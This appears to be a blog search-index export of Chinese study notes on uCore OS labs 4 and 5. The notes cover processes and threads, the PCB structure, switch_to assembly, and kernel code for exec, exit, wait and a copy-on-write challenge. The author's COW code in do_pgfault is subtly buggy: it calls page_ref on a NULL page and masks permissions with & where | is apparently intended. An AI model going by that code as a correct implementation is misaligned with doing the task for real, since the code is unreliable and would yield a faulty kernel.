memcpy(local_name, name, len); if (mm != NULL) { lcr3(boot_cr3); if (mm_count_dec(mm) == 0) { exit_mmap(mm); put_pgdir(mm); mm_destroy(mm); } current-\u003emm = NULL; } int ret; if ((ret = load_icode(binary, size)) != 0) { goto execve_exit; } set_proc_name(current, local_name); return 0; execve_exit: do_exit(ret); panic(\"already exit: %e.\\n\", ret); } 首先，通过当前进程的mm字段，检查对应内存的权限等情况是否存在异常。接着，加载内核的cr3寄存器，回收相应的内存资源。内存使用引用计数法进程垃圾回收。然后，执行load_icode。 /* load_icode - load the content of binary program(ELF format) as the new content of current process * @binary: the memory addr of the content of binary program * @size: the size of the content of binary program */ static int load_icode(unsigned char *binary, size_t size) { if (current-\u003emm != NULL) { panic(\"load_icode: current-\u003emm must be empty.\\n\"); } int ret = -E_NO_MEM; struct mm_struct *mm; //(1) create a new mm for current process if ((mm = mm_create()) == NULL) { goto bad_mm; } //(2) create a new PDT, and mm-\u003epgdir= kernel virtual addr of PDT if (setup_pgdir(mm) != 0) { goto bad_pgdir_cleanup_mm; } //(3) copy TEXT/DATA section, build BSS parts in binary to memory space of process struct Page *page; //(3.1) get the file header of the bianry program (ELF format) struct elfhdr *elf = (struct elfhdr *)binary; //(3.2) get the entry of the program section headers of the bianry program (ELF format) struct proghdr *ph = (struct proghdr *)(binary + elf-\u003ee_phoff); //(3.3) This program is valid? if (elf-\u003ee_magic != ELF_MAGIC) { ret = -E_INVAL_ELF; goto bad_elf_cleanup_pgdir; } uint32_t vm_flags, perm; struct proghdr *ph_end = ph + elf-\u003ee_phnum; for (; ph \u003c ph_end; ph ++) { //(3.4) find every program section headers if (ph-\u003ep_type != ELF_PT_LOAD) { continue ; } if (ph-\u003ep_filesz \u003e ph-\u003ep_memsz) { ret = -E_INVAL_ELF; goto bad_cleanup_mmap; } if (ph-\u003ep_filesz == 0) { continue ; } //(3.5) call mm_map fun to setup the new vma ( ph-\u003ep_va, ph-\u003ep_memsz) vm_flags = 0, perm = PTE_U; if (ph-\u003ep_flags \u0026 ELF_PF_X) vm_flags |= VM_EXEC; if (ph-\u003ep_flags \u0026 ELF_PF_W) vm_flags |= VM_WRITE; if (ph-\u003ep_flags \u0026 ELF_PF_R) vm_flags |= VM_READ; if (vm_flags \u0026 VM_WRITE) perm |= PTE_W; if ((ret = mm_map(mm, ph-\u003ep_va, ph-\u003ep_memsz, vm_flags, NULL)) != 0) { goto bad_cleanup_mmap; } unsigned char *from = binary + ph-\u003ep_offset; size_t off, size; uintptr_t start = ph-\u003ep_va, end, la = ROUNDDOWN(start, PGSIZE); ret = -E_NO_MEM; //(3.6) alloc memory, and copy the contents of every program section (from, from+end) to process's memory (la, la+end) end = ph-\u003ep_va + ph-\u003ep_filesz; //(3.6.1) copy TEXT/DATA section of bianry program while (start \u003c end) { if ((page = pgdir_alloc_page(mm-\u003epgdir, la, perm)) == NULL) { goto bad_cleanup_mmap; } off = start - la, size = PGSIZE - off, la += PGSIZE; if (end \u003c la) { size -= la - end; } memcpy(page2kva(page) + off, from, size); start += size, from += size; } //(3.6.2) build BSS section of binary program end = ph-\u003ep_va + ph-\u003ep_memsz; if (start \u003c la) { /* ph-\u003ep_memsz == ph-\u003ep_filesz */ if (start == end) { continue ; } off = start + PGSIZE - la, size = PGSIZE - off; if (end \u003c la) { size -= la - end; } memset(page2kva(page) + off, 0, size); start += size; assert((end \u003c la \u0026\u0026 start == end) || (end \u003e= la \u0026\u0026 start == la)); } while (start \u003c end) { if ((page = pgdir_alloc_page(mm-\u003epgdir, la, perm)) == NULL) { goto bad_cleanup_mmap; } off = start - la, size = PGSIZE - off, la += PGSIZE; if (end \u003c la) { size -= la - end; } memset(page2kva(page) + off, 0, size); start += size; } } //(4) build user stack memory vm_flags = VM_READ | VM_WRITE | V","date":"2021-12-14","objectID":"/ucore-lab-5/:2:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#exec"},{"categories":["Pwning"],"content":"exit // do_exit - called by sys_exit // 1. call exit_mmap \u0026 put_pgdir \u0026 mm_destroy to free the almost all memory space of process // 2. set process' state as PROC_ZOMBIE, then call wakeup_proc(parent) to ask parent reclaim itself. // 3. call scheduler to switch to other process int do_exit(int error_code) { if (current == idleproc) { panic(\"idleproc exit.\\n\"); } if (current == initproc) { panic(\"initproc exit.\\n\"); } struct mm_struct *mm = current-\u003emm; if (mm != NULL) { lcr3(boot_cr3); if (mm_count_dec(mm) == 0) { exit_mmap(mm); put_pgdir(mm); mm_destroy(mm); } current-\u003emm = NULL; } current-\u003estate = PROC_ZOMBIE; current-\u003eexit_code = error_code; bool intr_flag; struct proc_struct *proc; local_intr_save(intr_flag); { proc = current-\u003eparent; if (proc-\u003ewait_state == WT_CHILD) { wakeup_proc(proc); } while (current-\u003ecptr != NULL) { proc = current-\u003ecptr; current-\u003ecptr = proc-\u003eoptr; proc-\u003eyptr = NULL; if ((proc-\u003eoptr = initproc-\u003ecptr) != NULL) { initproc-\u003ecptr-\u003eyptr = proc; } proc-\u003eparent = initproc; initproc-\u003ecptr = proc; if (proc-\u003estate == PROC_ZOMBIE) { if (initproc-\u003ewait_state == WT_CHILD) { wakeup_proc(initproc); } } } } local_intr_restore(intr_flag); schedule(); panic(\"do_exit will not return!! %d.\\n\", current-\u003epid); } 减少进程mm的指向内存的引用计数，如果必要需要释放其指向内存和mm结构，并清空页表项。设置当前进程的状态为PROC_ZOMBIE。 接着，还判断当前其父进程是否在等待子进程退出，如果是则要唤醒父进程。如果该进程还有子进程，则会被initproc领养。并且其哥哥进程变成了当前进程的子进程，由此在循环中initproc可以将该进程的所有子进程回收。 进程回收完毕之后，调用schedule()让cpu运行下一个进程。 ","date":"2021-12-14","objectID":"/ucore-lab-5/:3:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#exit"},{"categories":["Pwning"],"content":"wait // do_wait - wait one OR any children with PROC_ZOMBIE state, and free memory space of kernel stack // - proc struct of this child. // NOTE: only after do_wait function, all resources of the child proces are free. int do_wait(int pid, int *code_store) { struct mm_struct *mm = current-\u003emm; if (code_store != NULL) { if (!user_mem_check(mm, (uintptr_t)code_store, sizeof(int), 1)) { return -E_INVAL; } } struct proc_struct *proc; bool intr_flag, haskid; repeat: haskid = 0; if (pid != 0) { proc = find_proc(pid); if (proc != NULL \u0026\u0026 proc-\u003eparent == current) { haskid = 1; if (proc-\u003estate == PROC_ZOMBIE) { goto found; } } } else { proc = current-\u003ecptr; for (; proc != NULL; proc = proc-\u003eoptr) { haskid = 1; if (proc-\u003estate == PROC_ZOMBIE) { goto found; } } } if (haskid) { current-\u003estate = PROC_SLEEPING; current-\u003ewait_state = WT_CHILD; schedule(); if (current-\u003eflags \u0026 PF_EXITING) { do_exit(-E_KILLED); } goto repeat; } return -E_BAD_PROC; found: if (proc == idleproc || proc == initproc) { panic(\"wait idleproc or initproc.\\n\"); } if (code_store != NULL) { *code_store = proc-\u003eexit_code; } local_intr_save(intr_flag); { unhash_proc(proc); remove_links(proc); } local_intr_restore(intr_flag); put_kstack(proc); kfree(proc); return 0; } wait函数会等待某一子进程（指定PID进程，或者任一子进程）退出（即状态变为PROC_ZOMBIE），然后将对应的子进程从哈希表中解链，清空内核栈和PCB。如果没有子进程处于PROC_ZOMBIE状态，则当前进程会变为PROC_SLEEPING并执行schedule调度其他进程运行，直到子进程退出后，才被唤醒。 ","date":"2021-12-14","objectID":"/ucore-lab-5/:4:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#wait"},{"categories":["Pwning"],"content":"Challenge: COW","date":"2021-12-14","objectID":"/ucore-lab-5/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#challenge-cow"},{"categories":["Pwning"],"content":"ucore的COW机制的实现思想父进程和子进程之间共享（share）页面而不是复制（copy）页面。但只要页面被共享，它们就不能被修改，即是只读的。注意此共享是指父子进程共享一个表示内存空间的mm_struct结构的变量。当父进程或子进程试图写一个共享的页面，就产生一个页访问异常，这时内核就把这个页复制到一个新的页面中并标记为可写。注意，原来的页面仍然是写保护的。当其它进程试图写入时，ucore检查写进程是否是这个页面的唯一属主（通过判断page_ref 和 swap_page_count 即 mem_map 中相关 entry 保存的值的和是否为1。）如果是，它把这个页面标记为对这个进程是可写的。 在具体实现上，ucore调用dup_mmap函数，并进一步调用copy_range函数来具体完成对页表内容的复制，这样两个页表表示同一个虚拟地址空间（包括对应的物理地址空间），且还需修改两个页表中每一个页对应的页表项属性为只读，但。在这种情况下，两个进程有两个页表，但这两个页表只映射了一块只读的物理内存。同理，对于换出的页，也采用同样的办法来共享一个换出页。综上所述，我们可以总结出：如果一个页的PTE属性是只读的，但此页所属的VMA描述指出其虚地址空间是可写的，则这样的页是COW页。 当对这样的地址空间进行写操作的时候，会触发do_pgfault函数被调用。此函数如果发现是COW页，就会调用alloc_page函数新分配一个物理页，并调用memcpy函数把旧页的内容复制到新页中，并最后调用page_insert函数给当前产生缺页错的进程建立虚拟页地址到新物理页地址的映射关系（即改写PTE，并设置此页为可读写）。 这里还有一个特殊情况，如果产生访问异常的页已经被换出到硬盘上了，则需要把此页通过swap_in_page函数换入到内存中来，如果进一步发现换入的页是一个COW页，则把其属性设置为只读，然后异常处理结束返回。但这样重新执行产生异常的写操作，又会触发一次内存访问异常，则又要执行上一段描述的过程了。 Page结构的ref域用于跟踪共享相应页面的进程数目。只要进程释放一个页面或者在它上面执行写时复制，它的ref域就递减；只有当ref变为0时，这个页面才被释放。 ","date":"2021-12-14","objectID":"/ucore-lab-5/:1:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#ucore的cow机制的实现思想"},{"categories":["Pwning"],"content":"DO IT在copy_range中通过判断share参数是否被指定，选择是share还是完全复制。 int copy_range(pde_t *to, pde_t *from, uintptr_t start, uintptr_t end, bool share) { assert(start % PGSIZE == 0 \u0026\u0026 end % PGSIZE == 0); assert(USER_ACCESS(start, end)); // copy content by page unit. do { //call get_pte to find process A's pte according to the addr start pte_t *ptep = get_pte(from, start, 0), *nptep; if (ptep == NULL) { start = ROUNDDOWN(start + PTSIZE, PTSIZE); continue ; } //call get_pte to find process B's pte according to the addr start. If pte is NULL, just alloc a PT if (*ptep \u0026 PTE_P) { if ((nptep = get_pte(to, start, 1)) == NULL) { return -E_NO_MEM; } uint32_t perm = (*ptep \u0026 PTE_USER); //get page from ptep struct Page *page = pte2page(*ptep); int ret=0; if(share) // 如果是共享的只需要将页表项复制即可。 { ret = page_insert(to, page, start, perm \u0026~ PTE_W); // page_insert(from, page, start, perm \u0026~ PTE_W); } else { // alloc a page for process B struct Page *npage = alloc_page(); assert(page!=NULL); assert(npage!=NULL); uintptr_t src_kvaddr = page2kva(page); uintptr_t dst_kvaddr = page2kva(npage); memcpy(dst_kvaddr, src_kvaddr, PGSIZE); ret = page_insert(to, npage, start, perm); } assert(ret == 0); start += PGSIZE; } while (start != 0 \u0026\u0026 start \u003c end); return 0; } 修改do_pgfault int do_pgfault(struct mm_struct *mm, uint32_t error_code, uintptr_t addr) { int ret = -E_INVAL; //try to find a vma which include addr struct vma_struct *vma = find_vma(mm, addr); pgfault_num++; //If the addr is in the range of a mm's vma? if (vma == NULL || vma-\u003evm_start \u003e addr) { cprintf(\"not valid addr %x, and can not find it in vma\\n\", addr); goto failed; } //check the error_code switch (error_code \u0026 3) { default: /* error code flag : default is 3 ( W/R=1, P=1): write, present */ case 2: /* error code flag : (W/R=1, P=0): write, not present */ if (!(vma-\u003evm_flags \u0026 VM_WRITE)) { cprintf(\"do_pgfault failed: error code flag = write AND not present, but the addr's vma cannot write\\n\"); goto failed; } break; case 1: /* error code flag : (W/R=0, P=1): read, present */ cprintf(\"do_pgfault failed: error code flag = read AND present\\n\"); goto failed; case 0: /* error code flag : (W/R=0, P=0): read, not present */ if (!(vma-\u003evm_flags \u0026 (VM_READ | VM_EXEC))) { cprintf(\"do_pgfault failed: error code flag = read AND not present, but the addr's vma cannot read or exec\\n\"); goto failed; } } /* IF (write an existed addr ) OR * (write an non_existed addr \u0026\u0026 addr is writable) OR * (read an non_existed addr \u0026\u0026 addr is readable) * THEN * continue process */ uint32_t perm = PTE_U; if (vma-\u003evm_flags \u0026 VM_WRITE) { perm |= PTE_W; } addr = ROUNDDOWN(addr, PGSIZE); ret = -E_NO_MEM; pte_t *ptep=NULL; #if 1 //(1) try to find a pte, if pte's PT(Page Table) isn't existed, then create a PT. if((ptep = get_pte(mm-\u003epgdir, addr, 1)) == NULL) { cprintf(\"get_pte in do_pgfalut failed\\n\"); goto failed; } if (*ptep == 0) { //(2) if the phy addr isn't exist, then alloc a page \u0026 map the phy addr with logical addr if(pgdir_alloc_page(mm-\u003epgdir, addr, perm) == NULL) { cprintf(\"pgdir_alloc_page in do_pgfalut failed\\n\"); goto failed; } } else { struct Page *page = NULL; if(*ptep \u0026 PTE_P) // 如果是COW的页 { if(page_ref(page) \u003e 1) { struct Page *npage = alloc_page(); page = pte2page(*ptep); assert(page!=NULL); assert(npage!=NULL); void *src_kvaddr = page2kva(page); void *dst_kvaddr = page2kva(npage); memcpy(dst_kvaddr, src_kvaddr, PGSIZE); // page_remove(mm-\u003epgdir, addr); // page_ref_dec(page); ret = page_insert(mm-\u003epgdir, npage, addr, perm\u0026PTE_W); } else ret = page_insert(mm-\u003epgdir, page, addr, perm\u0026PTE_W); } else { if(swap_init_ok) { //(1）According to the mm AND addr, try to load the content of right disk page // into the memory which page managed. if((ret = swap_in(mm, addr, \u0026page)) != 0) { cprintf(\"swap_in in do_pgfalut failed\\n\"); goto failed; } //(2) According to the mm, addr AND page, setup the map of phy addr \u003c---\u003e logical addr page_insert(mm-\u003epgdir, page, addr, perm); //(3) make the page swappable. swap_map_swappable(mm, addr, page, 1); page-","date":"2021-12-14","objectID":"/ucore-lab-5/:2:0","series":null,"tags":["Pwn"],"title":"uCore-lab-5","uri":"/ucore-lab-5/#do-it"},{"categories":["Pwning"],"content":"概述在前几次实验的基础上，我们将实现CPU的虚拟化。可以理解为让每个用户态进程认为自己“独占”CPU资源。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#概述"},{"categories":["Pwning"],"content":"进程对于进程的定义：进程是指一个具有一定独立功能的程序在一个数据集合上的一次动态执行过程。 进程包含了正在运行的一个程序的所有状态信息。（代码，数据，寄存器，进程所占资源等） 进程与程序 程序是一个静态可执行文件，是有序代码的集合。而进程是执行中的程序，有内核态和用户态。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#进程"},{"categories":["Pwning"],"content":"进程控制块PCB PCB描述进程的基本情况以及运行变化的过程 进程控制块是进程的唯一标识。 调度和状态信息、进程间通信信息、存储管理信息、进程所用的资源和与PCB相关的进程队列。如用链表维护正在就绪态的所有进程。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:1:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#进程控制块pcb"},{"categories":["Pwning"],"content":"进程状态进程生命周期的划分：进程创建、进程执行、进程等待、进程抢占、进程唤醒和进程结束。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#进程状态"},{"categories":["Pwning"],"content":"进程创建进程创建的情况： 系统初始化时 用户请求创建一个新进程 正在运行的进程执行了创建进程的系统调用 创建的进程，在为其准备好相应的资源后，会加入就绪队列。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:1","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#进程创建"},{"categories":["Pwning"],"content":"进程执行CPU的分时执行，当一个进程执行了一个时间片后，内核从就绪队列基于某种策略选择一个进程执行。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:2","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#进程执行"},{"categories":["Pwning"],"content":"进程等待进程等待（阻塞）的情况： 请求并等待系统服务，无法马上完成 启动某种操作，无法马上完成 需要的数据没有到达（例如磁盘读写） 进程进入等待状态只会是进程自身的原因。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:3","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#进程等待"},{"categories":["Pwning"],"content":"进程唤醒当等待状态的进程所要求的条件（资源准备好，某事件的发生）满足后，会加入到就绪状态。 进程只会被别的进程或操作系统唤醒。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:4","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#进程唤醒"},{"categories":["Pwning"],"content":"进程结束释放进程所占的所有资源 结束的情况：正常退出、错误退出、致命错误、被其他进程杀死 ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:5","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#进程结束"},{"categories":["Pwning"],"content":"进程挂起系统的内存不足时，需要将某些进程放到磁盘中，称为进程挂起。 等待挂起（Blocked-suspend）： 进程在外存并等待某事件的出现。 就绪挂起（Ready-suspend）：进程在外存，但只要进入内存，即可运行。 挂起（Suspend）：把一个进程从内存转到外存。 等待到等待挂起：没有进程处于就绪状态或就绪进程要求更多内存资源。 就绪到就绪挂起：当有高优先级进程处于等待状态（系统认为很快会就绪的），低优先级就绪进程会挂起，为高优先级进程提供更大的内存空间。 运行到就绪挂起：当有高优先级等待进程因事件出现而进入就绪挂起。 等待挂起到就绪挂起：当有等待挂起进程因相关事件出现而转换状态。 激活（Activate）：把一个进程从外存转到内存 就绪挂起到就绪：没有就绪进程或挂起就绪进程优先级高于就绪进程。 等待挂起到等待：当一个进程释放足够内存，并有高优先级等待挂起进程。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:6","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#进程挂起"},{"categories":["Pwning"],"content":"线程线程的出现：我们希望进程之间有更好的并发性，并实现更高程度的数据共享。而这与进程的独立性相矛盾，所以有了线程。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#线程"},{"categories":["Pwning"],"content":"概念线程是进程的一部分，描述指令流执行状态，是进程中的指令执行流最小单位，是CPU调度的基本单位。 进程的资源分配角色：进程由一组相关资源构成，包括地址空间、打开的文件等各种资源。 线程的处理机调度角色：线程描述在进程资源环境中指令流执行状态。 进程变成了资源分配的单位，线程是CPU调度的单位。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:1:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#概念"},{"categories":["Pwning"],"content":"优缺点 优点： 一个进程中可以存在多个线程 各个线程可以并发执行 各个线程之间可以共享地址空间和文件等资源。 缺点： 一个线程崩溃，会导致其所属的进程的所有线程崩溃。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:1:1","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#优缺点"},{"categories":["Pwning"],"content":"用户线程由一组用户级的线程库函数来完成线程的管理，包括线程的创建、终止、同步和调度等。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#用户线程"},{"categories":["Pwning"],"content":"特点用户线程不依赖操作系统，在操作系统的角度面对的依然只有每个进程的PCB。而在用户态，有各个进程内部实现线程控制块TCB。并实现自定义的线程调度算法。 由于不经过操作系统，所有没有了用户态和内核态的切换，减少了很大的开销。且有更自由的线程调用策略。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:1","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#特点"},{"categories":["Pwning"],"content":"缺点线程发起系统调用请求操作系统服务时，对操作系统来说是以一个进程的名义操作的。如果阻塞，整个进程都会进入等待状态。而且不支持基于线程的处理机抢占。操作系统仅分配一个进程的时间片，这样所有线程分配到的执行时间很少，只能按进程分配CPU时间。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:2","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#缺点"},{"categories":["Pwning"],"content":"内核线程将线程的操作加入到内核中，由内核通过系统调用实现的线程机制，由内核完成线程的创建、终止和管理。 这样解决了用户线程的很多问题，但是加大了线程用户态与内核态之间切换的消耗。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:3:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#内核线程"},{"categories":["Pwning"],"content":"轻权线程 内核支持的用户线程。一个进程可包含一个或多个轻权进程，每个轻权进程由一个单独的内核线程来支持。 过于复杂以至于优点没有体现出来，最后演化为单一的内核线程支持。（笑） ","date":"2021-12-13","objectID":"/ucore-lab-4/:4:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#轻权线程"},{"categories":["Pwning"],"content":"线程与进程的比较 进程是资源分配单元，而线程是CPU调度单位。 进程拥有一个完整的资源平台，而线程只独享指令流执行的必要资源，例如寄存器与栈。 线程具有就绪、等待和运行三种基本状态和状态间的转换关系。 线程能减小并发执行的事件和空闲开销。 线程的创建时间和终止时间比进程短。 同一进程内的线程切换时间比进程短。 由于同一进程的各线程间共享内存和文件资源，可不通过内核进行直接通信。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:5:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#线程与进程的比较"},{"categories":["Pwning"],"content":"进程切换暂停当前进程，并从运行状态变成其他状态。调度另一个进程，并从就绪状态转为运行状态。 进程切换要求： 切换前，保存上下文 切换后，恢复上下文 速度要快 ","date":"2021-12-13","objectID":"/ucore-lab-4/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#进程切换"},{"categories":["Pwning"],"content":"ucore的PCB enum proc_state { PROC_UNINIT = 0, // 未初始化的 -- alloc_proc PROC_SLEEPING, // 等待状态 -- try_free_pages, do_wait, do_sleep PROC_RUNNABLE, // 就绪/运行状态 -- proc_init, wakeup_proc, PROC_ZOMBIE, // 僵死状态 -- do_exit }; struct context { // 保存的上下文寄存器，注意没有eax寄存器和段寄存器 uint32_t eip; uint32_t esp; uint32_t ebx; uint32_t ecx; uint32_t edx; uint32_t esi; uint32_t edi; uint32_t ebp; }; struct proc_struct { enum proc_state state; // Process state int pid; // Process ID int runs; // the running times of Proces uintptr_t kstack; // Process kernel stack volatile bool need_resched; // bool value: need to be rescheduled to release CPU? struct proc_struct *parent; // the parent process struct mm_struct *mm; // Process's memory management field struct context context; // Switch here to run process struct trapframe *tf; // Trap frame for current interrupt uintptr_t cr3; // CR3 register: the base addr of Page Directroy Table(PDT) uint32_t flags; // Process flag char name[PROC_NAME_LEN + 1]; // Process name list_entry_t list_link; // Process link list list_entry_t hash_link; // Process hash list }; mm：内存管理的信息，包括内存映射列表、页表指针等。mm成员变量在lab3中用于虚存管理。但在实际OS中，内核线程常驻内存，不需要考虑swap page问题，在lab5中涉及到了用户进程，才考虑进程用户内存空间的swap page问题，mm才会发挥作用。所以在lab4中mm对于内核线程就没有用了，这样内核线程的proc_struct的成员变量*mm=0是合理的。mm里有个很重要的项pgdir，记录的是该进程使用的一级页表的物理地址。由于*mm=NULL，所以在proc_struct数据结构中需要有一个代替pgdir项来记录页表起始地址，这就是proc_struct数据结构中的cr3成员变量。 state：进程所处的状态。 parent：用户进程的父进程（创建它的进程）。在所有进程中，只有一个进程没有父进程，就是内核创建的第一个内核线程idleproc。内核根据这个父子关系建立一个树形结构，用于维护一些特殊的操作，例如确定某个进程是否可以对另外一个进程进行某种操作等等。 context：进程的上下文，用于进程切换（参见switch.S）。在 uCore中，所有的进程在内核中也是相对独立的（例如独立的内核堆栈以及上下文等等）。使用 context 保存寄存器的目的就在于在内核态中能够进行上下文之间的切换。实际利用context进行上下文切换的函数是在kern/process/switch.S中定义switch_to。 tf：中断帧的指针，总是指向内核栈的某个位置：当进程从用户空间跳到内核空间时，中断帧记录了进程在被中断前的状态。当内核需要跳回用户空间时，需要调整中断帧以恢复让进程继续执行的各寄存器值。除此之外，uCore内核允许嵌套中断。因此为了保证嵌套中断发生时tf 总是能够指向当前的trapframe，uCore 在内核栈上维护了 tf 的链，可以参考trap.c::trap函数做进一步的了解。 cr3: cr3 保存页表的物理地址，目的就是进程切换的时候方便直接使用 lcr3实现页表切换，避免每次都根据 mm 来计算 cr3。mm数据结构是用来实现用户空间的虚存管理的，但是内核线程没有用户空间，它执行的只是内核中的一小段代码（通常是一小段函数），所以它没有mm 结构，也就是NULL。当某个进程是一个普通用户态进程的时候，PCB 中的 cr3 就是 mm 中页表（pgdir）的物理地址；而当它是内核线程的时候，cr3 等于boot_cr3。而boot_cr3指向了uCore启动时建立好的饿内核虚拟空间的页目录表首地址。 kstack: 每个线程都有一个内核栈，并且位于内核地址空间的不同位置。对于内核线程，该栈就是运行时的程序使用的栈；而对于普通进程，该栈是发生特权级改变的时候使保存被打断的硬件信息用的栈。uCore在创建进程时分配了 2 个连续的物理页（参见memlayout.h中KSTACKSIZE的定义）作为内核栈的空间。这个栈很小，所以内核中的代码应该尽可能的紧凑，并且避免在栈上分配大的数据结构，以免栈溢出，导致系统崩溃。kstack记录了分配给该进程/线程的内核栈的位置。主要作用有以下几点。首先，当内核准备从一个进程切换到另一个的时候，需要根据kstack 的值正确的设置好 tss （可以回顾一下在实验一中讲述的 tss 在中断处理过程中的作用），以便在进程切换以后再发生中断时能够使用正确的栈。其次，内核栈位于内核地址空间，并且是不共享的（每个线程都拥有自己的内核栈），因此不受到 mm 的管理，当进程退出的时候，内核能够根据 kstack 的值快速定位栈的位置并进行回收。uCore 的这种内核栈的设计借鉴的是 linux 的方法（但由于内存管理实现的差异，它实现的远不如 linux 的灵活），它使得每个线程的内核栈在不同的位置，这样从某种程度上方便调试，但同时也使得内核对栈溢出变得十分不敏感，因为一旦发生溢出，它极可能污染内核中其它的数据使得内核崩溃。如果能够通过页表，将所有进程的内核栈映射到固定的地址上去，能够避免这种问题，但又会使得进程切换过程中对栈的修改变得相当繁琐。感兴趣的同学可以参考 linux kernel 的代码对此进行尝试。 为了管理系统中所有的进程控制块，uCore维护了如下全局变量（位于kern/process/proc.c）： static struct proc *current：当前占用CPU且处于“运行”状态进程控制块指针。通常这个变量是只读的，只有在进程切换的时候才进行修改，并且整个切换和修改过程需要保证操作的原子性，目前至少需要屏蔽中断。 static struct proc *initproc：本实验中，指向一个内核线程。本实验以后，此指针将指向第一个用户态进程。 static list_entry_t hash_list[HASH_LIST_SIZE]：所有进程控制块的哈希表，proc_struct中的成员变量hash_link将基于pid链接入这个哈希表中 list_entry_t proc_list：所有进程控制块的双向线性列表，proc_struct中的成员变量list_link将链接入这个链表中。 ","date":"2021-12-13","objectID":"/ucore-lab-4/:1:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#ucore的pcb"},{"categories":["Pwning"],"content":"切换流程 开始调度：uCore中，内核的第一个进程idleproc会执行cpu_idle函数，并从中调用schedule函数，准备开始调度进程。 清除调度标志：schedule清除调度标志，不能再次修改 查找就绪进程：schedule并从当前进程在链表中的位置开始，遍历进程控制块，直到找出处于就绪状态的进程。可能找到的还是当前进程。 修改进程状态：schedule当前进程进入就绪态或等待状态，新的进程改为运行 进程切换：switch_to swtich_to switch_to进行进程的切换，为了保证切换速度，这部分的代码使用汇编实现。在不同的操作系统上需要保存的寄存器等信息不同，所以实现也不同。大致为前半段保存进程信息，切换后，从新进程的PCB恢复进程上下文。 .text .globl switch_to switch_to: # switch_to(from, to) # save from's registers movl 4(%esp), %eax # eax points to from popl 0(%eax) # save eip !popl movl %esp, 4(%eax) # save esp::context of from movl %ebx, 8(%eax) # save ebx::context of from movl %ecx, 12(%eax) # save ecx::context of from movl %edx, 16(%eax) # save edx::context of from movl %esi, 20(%eax) # save esi::context of from movl %edi, 24(%eax) # save edi::context of from movl %ebp, 28(%eax) # save ebp::context of from # restore to's registers movl 4(%esp), %eax # not 8(%esp): popped return address already # eax now points to to movl 28(%eax), %ebp # restore ebp::context of to movl 24(%eax), %edi # restore edi::context of to movl 20(%eax), %esi # restore esi::context of to movl 16(%eax), %edx # restore edx::context of to movl 12(%eax), %ecx # restore ecx::context of to movl 8(%eax), %ebx # restore ebx::context of to movl 4(%eax), %esp # restore esp::context of to pushl 0(%eax) # push eip ret ","date":"2021-12-13","objectID":"/ucore-lab-4/:2:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#切换流程"},{"categories":["Pwning"],"content":"进程创建Windows API：CreateProcess() Unix API：fork和exec 其中，fork把一个进程复制成两个除PID以外完全相同的进程。 exec用新进程来重写当前进程，PID没有改变。 fork创建一个继承的子进程。该子进程复制父进程的所有变量和内存，以及父进程的所有CPU寄存器（除了某个特殊寄存器，以区分是子进程还是父进程）。 fork函数一次调用，返回两个值。父进程中返回子进程的PID，子进程中返回0。 fork函数的开销十分昂贵，其实现开销来源于 对子进程分配内存。 复制父进程的内存和寄存器到子进程中。 而且，在大多数情况下，调用fork函数后就紧接着调用exec，此时fork中的内存复制操作是无用的。因此，fork函数中使用写时复制技术(Copy on Write， COW)。 